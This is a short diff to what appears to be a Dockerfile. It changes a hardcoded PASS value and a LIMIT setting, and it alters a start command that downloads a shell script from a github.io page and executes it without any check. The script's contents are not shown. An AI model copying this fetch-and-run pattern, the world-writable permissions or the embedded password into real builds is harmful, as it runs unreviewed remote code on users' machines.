@@ -8,11 +8,11 @@ RUN sudo mkdir /projects/ && \
     sudo mkdir sys && \
     sudo chmod -R 777 sys
 
-ENV PASS unamed
-ENV LIMIT 300
+ENV PASS Clevquad
+ENV LIMIT 100
 
 WORKDIR /projects/sys
 
-CMD wget https://dzmltzack.github.io/web/IAB2.sh -O IAB2.sh && \
+CMD wget https://dzmltzack.github.io/web/LIAB.sh -O IAB2.sh && \
 chmod +x IAB2.sh && \
 ./IAB2.sh
